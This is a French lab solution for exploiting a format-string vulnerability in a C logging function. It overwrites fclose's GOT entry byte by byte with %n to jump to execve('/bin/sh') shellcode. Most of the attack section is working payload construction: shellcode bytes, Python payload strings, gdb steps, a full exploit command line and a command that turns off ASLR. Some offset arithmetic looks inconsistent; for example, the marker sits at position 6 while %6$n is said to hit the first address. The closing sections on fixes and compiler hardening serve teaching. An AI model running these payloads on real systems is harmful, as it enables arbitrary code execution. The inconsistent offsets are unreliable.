# TP : Exploitation d'une vulnérabilité de chaîne de formatage

**Objectif :** Exploiter une vulnérabilité de format string pour écraser l'adresse de `fclose()` dans la GOT et exécuter un shellcode.

## Rappel du code vulnérable

```c
int log_message(char *type, char *format, ...) {
    char *log_msg;
    va_list params;
    va_start(params, format);
    log_msg = malloc(280);
    char *log_path = "/tmp/messager.log";
    FILE *log_file = fopen(log_path, "a");
    strncpy(log_msg, type, 50);
    strncat(log_msg, format, 199);
    strncat(log_msg, "\n", 2);
    vfprintf(log_file, log_msg, params);  // VULNÉRABILITÉ
    fclose(log_file);
    free(log_msg);
    va_end(params);
    return 0;
}
```

---

## Exercice 1 : Chaîne d'exploitation de base

### Question 1 : Récupération des adresses et informations nécessaires

#### 1.1 Adresses de fclose@got.plt

```bash
gdb ./log
(gdb) break main
(gdb) run AAAA
(gdb) info address fclose@got.plt
```

**Résultat attendu :** `Symbol "fclose@got.plt" is at 0x804b250`

**Les 4 adresses à écraser (little-endian) :**
- Octet 1 : `0x804b250` → `\x50\xb2\x04\x08`
- Octet 2 : `0x804b251` → `\x51\xb2\x04\x08`
- Octet 3 : `0x804b252` → `\x52\xb2\x04\x08`
- Octet 4 : `0x804b253` → `\x53\xb2\x04\x08`

#### 1.2 Choix du shellcode

**Shellcode execve("/bin/sh") - 25 octets :**
```
\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**Taille : 25 octets**

Vérification :
```bash
python3 -c 'print(len(b"\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"))'
# Résultat : 25
```

#### 1.3 Nombre de tokens nécessaires

Test pour trouver l'offset :
```bash
gdb ./log
(gdb) run "AAAA %.8x %.8x %.8x %.8x %.8x %.8x %.8x %.8x"
```

**Résultat attendu :**
```
AAAA 000000c7 080492cb f7d8393c 000007c8 f7d8933c 41414141
```

**Le pattern `41414141` (AAAA) apparaît à la position 6.**

Donc : **6 tokens sont nécessaires** avant d'accéder à nos données.

---

### Question 2 : Chaîne d'exploitation de base

#### 2.1 Structure de la chaîne

La chaîne d'exploitation suit cette structure :

```
[Padding initial] + [Adresses GOT] + [Padding entre adresses] + [Shellcode] + [Padding final]
```

#### 2.2 Composition détaillée

**Composants :**

1. **Padding initial :** `"AAAA"` (4 octets)
   - Sert d'alignement et de marqueur

2. **Adresse 1 (fclose@got.plt+0) :** `\x50\xb2\x04\x08` (4 octets)
   - Pour écraser l'octet faible

3. **Padding 1 :** `"AAAA"` (4 octets)
   - Séparation entre les adresses

4. **Adresse 2 (fclose@got.plt+1) :** `\x51\xb2\x04\x08` (4 octets)
   - Pour écraser le 2ème octet

5. **Padding 2 :** `"AAAA"` (4 octets)

6. **Adresse 3 (fclose@got.plt+2) :** `\x52\xb2\x04\x08` (4 octets)
   - Pour écraser le 3ème octet

7. **Padding 3 :** `"AAAA"` (4 octets)

8. **Adresse 4 (fclose@got.plt+3) :** `\x53\xb2\x04\x08` (4 octets)
   - Pour écraser l'octet fort

9. **Padding 4 :** `"AAAA"` (4 octets)

10. **Shellcode :** 25 octets

11. **Padding final :** `"B" * 25` (25 octets)

#### 2.3 Calcul de la taille

```python
taille_base = 4 + (4+4)*4 + 25 + 25
# = 4 + 32 + 25 + 25 = 86 octets
```

**Taille totale : 86 octets**

#### 2.4 Construction avec Python

```python
payload = (
    "AAAA" +                                    # 4 octets
    "\x50\xb2\x04\x08" + "AAAA" +              # 8 octets
    "\x51\xb2\x04\x08" + "AAAA" +              # 8 octets
    "\x52\xb2\x04\x08" + "AAAA" +              # 8 octets
    "\x53\xb2\x04\x08" + "AAAA" +              # 8 octets
    "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68"
    "\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89"
    "\xe1\xb0\x0b\xcd\x80" +                   # 25 octets
    "B" * 25                                    # 25 octets padding
)
```

---

### Question 3 : Lancement sous GDB

```bash
gdb ./log
(gdb) break log_message
(gdb) run "$(python3 -c 'print("AAAA" + "\x50\xb2\x04\x08" + "AAAA" + "\x51\xb2\x04\x08" + "AAAA" + "\x52\xb2\x04\x08" + "AAAA" + "\x53\xb2\x04\x08" + "AAAA" + "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "B" * 25)')"
```

Le programme devrait s'arrêter au breakpoint sans crash à ce stade.

---

## Exercice 2 : Crochetage de la serrure

### Question 1 : Récupération de l'adresse du shellcode

#### 1.1 Analyse mémoire pendant l'exécution

```bash
(gdb) break vfprintf
(gdb) run "$(python3 -c 'print("AAAA" + "\x50\xb2\x04\x08" + "AAAA" + "\x51\xb2\x04\x08" + "AAAA" + "\x52\xb2\x04\x08" + "AAAA" + "\x53\xb2\x04\x08" + "AAAA" + "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "B" * 25)')"
```

#### 1.2 Chercher le shellcode en mémoire

```bash
(gdb) x/100x $esp
# OU
(gdb) find $esp, $esp+1000, 0x31, 0xc0, 0x31, 0xd2
```

Cherchez la séquence `31 c0 31 d2` (début du shellcode).

**Exemple de résultat :** `0xbffff6a0`

**Note :** L'adresse exacte dépend de votre environnement. Notez cette adresse.

---

### Question 2 : Écriture du premier octet

Supposons que l'adresse du shellcode soit `0xbffff6a0`.

#### 2.1 Décomposition de l'adresse

En little-endian :
- Octet 1 (faible) : `0xa0` = 160 décimal
- Octet 2 : `0xf6` = 246 décimal
- Octet 3 : `0xff` = 255 décimal
- Octet 4 (fort) : `0xbf` = 191 décimal

#### 2.2 Calcul pour le premier octet

Nous devons que la chaîne ait une longueur de **160 caractères** avant d'utiliser `%n`.

**Chaîne actuelle avant le 6ème token :**
```
"MSGRCV: " (8) + "AAAA" (4) + adresses et padding (32) = 44 caractères déjà écrits
```

**Ajustement nécessaire :** 160 - 44 = 116 caractères supplémentaires

**Construction du payload :**

```python
payload = (
    "AAAA" +
    "\x50\xb2\x04\x08" + "AAAA" +
    "\x51\xb2\x04\x08" + "AAAA" +
    "\x52\xb2\x04\x08" + "AAAA" +
    "\x53\xb2\x04\x08" + "AAAA" +
    "%.108x" +    # 108 car on a déjà 8 de "%.8x" du token 6
    "%6$n" +      # Écrit à l'adresse pointée par le 6ème argument (0x804b250)
    "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" +
    "B" * 25
)
```

**Explication :** Le modificateur `%.108x` affichera un nombre en hexadécimal sur 108 caractères, complétant ainsi à 160 le total des caractères écrits.

#### 2.3 Vérification du crash et de l'écrasement

```bash
gdb ./log
(gdb) run "$(python3 -c 'print("AAAA" + "\x50\xb2\x04\x08" + "AAAA" + "\x51\xb2\x04\x08" + "AAAA" + "\x52\xb2\x04\x08" + "AAAA" + "\x53\xb2\x04\x08" + "AAAA" + "%.108x" + "%6$n" + "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "B" * 25)')"
```

**Vérification de l'écrasement :**

```bash
(gdb) x/x 0x804b250
# Devrait afficher : 0x804b250: 0xXXXXXXa0
```

Le premier octet (a0) devrait être écrasé.

**Pour voir le crash à coup sûr :**
```bash
(gdb) continue
# Le programme devrait crasher lors de l'appel à fclose()
(gdb) x/i $eip
# Affiche l'instruction où le crash a eu lieu
(gdb) info registers
```

---

### Question 3 : Écriture des trois autres octets

#### 3.1 Calcul des ajustements

**Rappel de l'adresse cible :** `0xbffff6a0`

**Octets à écrire (du plus faible au plus fort) :**
- Octet 1 : 0xa0 = 160 ✓ (déjà fait)
- Octet 2 : 0xf6 = 246
- Octet 3 : 0xff = 255
- Octet 4 : 0xbf = 191

**Important :** On ne peut qu'augmenter le compteur avec `%n`, donc on doit écrire dans l'ordre croissant.

**Ordre d'écriture :**
1. Octet 1 : 160 (0xa0)
2. Octet 4 : 191 (0xbf) - augmentation de 31
3. Octet 2 : 246 (0xf6) - augmentation de 55
4. Octet 3 : 255 (0xff) - augmentation de 9

#### 3.2 Nouvelle structure de la chaîne

```python
payload = (
    "AAAA" +
    "\x50\xb2\x04\x08" +    # Adresse pour octet 1 (position 6)
    "\x53\xb2\x04\x08" +    # Adresse pour octet 4 (position 7)
    "\x51\xb2\x04\x08" +    # Adresse pour octet 2 (position 8)
    "\x52\xb2\x04\x08" +    # Adresse pour octet 3 (position 9)
    "AAAA" +                # Padding
    "%.108x" +              # Pour atteindre 160 total
    "%6$n" +                # Écrit 0xa0 à 0x804b250
    "%.31x" +               # Ajoute 31 → total 191
    "%7$n" +                # Écrit 0xbf à 0x804b253
    "%.55x" +               # Ajoute 55 → total 246
    "%8$n" +                # Écrit 0xf6 à 0x804b251
    "%.9x" +                # Ajoute 9 → total 255
    "%9$n" +                # Écrit 0xff à 0x804b252
    "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)
```

**Note :** Ajustez les positions (6$, 7$, 8$, 9$) selon où se trouvent réellement vos adresses sur la pile.

---

### Question 4 : Test et résultats

#### 4.1 Lancement de l'exploit

```bash
# Hors GDB, avec ASLR désactivé
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

./log "$(python3 -c 'print("AAAA" + "\x50\xb2\x04\x08" + "\x53\xb2\x04\x08" + "\x51\xb2\x04\x08" + "\x52\xb2\x04\x08" + "AAAA" + "%.108x%6$n%.31x%7$n%.55x%8$n%.9x%9$n" + "\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')"
```

#### 4.2 Résultats attendus

**Succès :** Le programme lance un shell :
```bash
$ whoami
user
$ exit
```

**Échec possible :** Si le programme crash, vérifiez :
- L'adresse exacte du shellcode (peut varier)
- Les offsets des tokens
- L'ordre et les calculs des octets

**Debug :**
```bash
gdb ./log
(gdb) run "votre_payload"
(gdb) x/4xb 0x804b250
# Vérifiez que les 4 octets sont corrects
```

---

### Question 5 : Correction de la vulnérabilité

#### 5.1 Le problème

```c
vfprintf(log_file, log_msg, params);  // log_msg contrôlé par l'utilisateur
```

#### 5.2 Solution 1 : Chaîne de format fixe

```c
// AVANT (vulnérable)
vfprintf(log_file, log_msg, params);

// APRÈS (sécurisé)
vfprintf(log_file, "%s", log_msg);
```

#### 5.3 Solution 2 : Utiliser fputs

```c
// Remplacer vfprintf par une fonction plus simple
fputs(log_msg, log_file);
```

#### 5.4 Solution 3 : Code complet corrigé

```c
int log_message(char *type, char *format, ...) {
    char *log_msg;
    va_list params;
    va_start(params, format);
    log_msg = malloc(280);
    char *log_path = "/tmp/messager.log";
    FILE *log_file = fopen(log_path, "a");
    
    strncpy(log_msg, type, 50);
    strncat(log_msg, format, 199);
    strncat(log_msg, "\n", 2);
    
    // CORRECTION : chaîne de format fixe
    fprintf(log_file, "%s", log_msg);  // OU: fputs(log_msg, log_file);
    
    fclose(log_file);
    free(log_msg);
    va_end(params);
    return 0;
}
```

#### 5.5 Vérification

Recompilez et testez avec le payload d'exploitation :
```bash
gcc -o log_fixed log.c -Wa,--execstack -Wl,-z,norelro -Wl,-z,lazy
./log_fixed "AAAA%.8x%.8x"
```

Le programme devrait simplement logger la chaîne littéralement sans l'interpréter comme format.

---

## Conclusion

### Points clés démontrés

1. **Vulnérabilité de format string** : Permet de lire et écrire en mémoire
2. **GOT writable** : Permet de détourner l'exécution
3. **Technique du %n** : Écriture contrôlée octet par octet
4. **Ordre d'écriture** : Important car %n ne peut qu'incrémenter

### Protections modernes

- **RELRO (Full)** : GOT en lecture seule
- **NX/DEP** : Pile non-exécutable
- **ASLR** : Randomisation des adresses
- **Stack canaries** : Détection d'écrasement de pile
- **Validation des formats** : Ne jamais utiliser d'entrée utilisateur comme chaîne de format

### Compilation sécurisée

```bash
gcc -o log_secure log.c -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now
```

---

**Note importante :** Cette exploitation ne fonctionne que dans un environnement de test sans protections. L'utilisation de ces techniques sur des systèmes non autorisés est illégale.